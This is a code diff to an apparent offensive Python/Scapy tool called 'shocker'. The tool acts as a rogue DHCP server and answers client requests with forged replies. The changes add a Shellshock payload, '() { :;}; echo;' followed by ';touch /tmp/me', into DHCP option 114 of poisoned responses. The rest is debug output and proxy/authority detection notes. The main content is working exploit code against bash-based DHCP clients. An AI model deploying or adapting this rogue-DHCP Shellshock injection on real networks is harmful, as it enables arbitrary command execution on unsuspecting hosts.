@@ -337,8 +337,7 @@ DHCP_PARAMETERS = {
     255: "End"
     }
 
-# Dictionary {header:attack string} to try on discovered CGI scripts
-# Where attack string comprises exploit + success_flag + command
+# List of attack strings
 ATTACKS = [
    "() { %3a;}; echo; "
    ]
@@ -702,6 +701,9 @@ def do_dhcp_attack():
 def look_for_dhcp_servers():
     """Send a DHCPDISCOVER message to Ethernet broadcast and listen for servers
     to respond
+    INCOMPLETE - shocker will eventually behave differently according
+    to whether or not it finds itself on a network with a live DHCP server
+    I.e. Authority or proxy
     """
     print "[+] Looking for DHCP servers on the network, please wait..."
     conf.checkIPaddr = False
@@ -737,16 +739,16 @@ def look_for_dhcp_servers():
             )
     answered, unanswered = results
     result_size = len(answered)
-    print "results size is: %d" % result_size
+    print "DEBUG results size is: %d" % result_size
     if result_size > 0:
-        print "[I] Found: " + str(result_size)
+        print "[I] Found: %d - shocker is DHCP proxy" % result_size
         answer = answered[0][1]
         print "[!] " + answer.command()
         print "[+] Server IP: %s" % answer[IP].src
         for option in answer[DHCP].options:
             if type(option) == tuple:
                 print "[+] OPTION: " + str(option)
-    else: print "[I] None found"
+    else: print "[I] None found - shocker is DHCP authority"
 
 
 def wait_for_dhcp_client_request():
@@ -755,27 +757,29 @@ def wait_for_dhcp_client_request():
 
 
 def process_dhcp(pkt):
-    options = get_dhcp_options(pkt)
-    request_type = DHCP_REQUEST_TYPE[options['message-type']] 
-    requested_paramaters = {}
-    print request_type 
-    print "DHCP options: %s" % str(options)
-    if options.has_key('param_req_list'):
-        requested_parameters = get_param_req_dict(options['param_req_list'])
-        print "Parameters requested: %s" % str(requested_parameters).strip('[]')
-    print "Command: %s" % str(pkt.command())
-    if request_type == "DHCPDISCOVER" or \
-            request_type == "DHCPREQUEST" or \
-            request_type == "DHCPINFORM":
-        print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
-        poison_dhcp_client(pkt, request_type, requested_parameters) 
-    print "-----------------------------------"
+    if pkt.haslayer('DHCP'):
+        options = get_dhcp_options(pkt)
+        request_type = DHCP_REQUEST_TYPE[options['message-type']] 
+        requested_paramaters = {}
+        print request_type 
+        print "DHCP options: %s" % str(options)
+        if options.has_key('param_req_list'):
+            requested_parameters = get_param_req_dict(options['param_req_list'])
+            print "Parameters requested: %s" % str(requested_parameters).strip('[]')
+        print "Command: %s" % str(pkt.command())
+        if request_type == "DHCPDISCOVER" or \
+                request_type == "DHCPREQUEST" or \
+                request_type == "DHCPINFORM":
+            print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
+            poison_dhcp_client(pkt, request_type, requested_parameters) 
+        print "-----------------------------------"
 
 
 def get_dhcp_options(pkt):
     """Return a dictonary to DHCP options from the DHCP packet supplied
     """
     option_dictionary = {}
+    print "DEBUG - pkt: " + str(pkt) + str(type(pkt))
     for option in pkt[DHCP].options:
         if type(option) == tuple:
             k ,v = option
@@ -785,6 +789,8 @@ def get_dhcp_options(pkt):
 
 def get_param_req_dict(param_req_list):
     """
+    Send an appropriate response to a client request with valid paramaters
+    as well as a poinsoned DHCP option (currently hardcoded to 114/URL.
     """
     parameter_dictionary = {}
     for param in param_req_list:
@@ -820,6 +826,7 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
                     ('name_server', '10.10.10.1'), 
                     ('domain', 'localdomain'), 
                     ('broadcast_address', '10.10.10.255'), 
+                    (114, 'TEST' + ATTACKS[0] + ';touch /tmp/me'),
                     'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                     ]
                 )
@@ -850,6 +857,7 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
                     ('name_server', '10.10.10.1'), 
                     ('domain', 'localdomain'), 
                     ('broadcast_address', '10.10.10.255'), 
+                    (114, 'TEST' + ATTACKS[0] + ';touch /tmp/me'),
                     'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                     ]
                 )
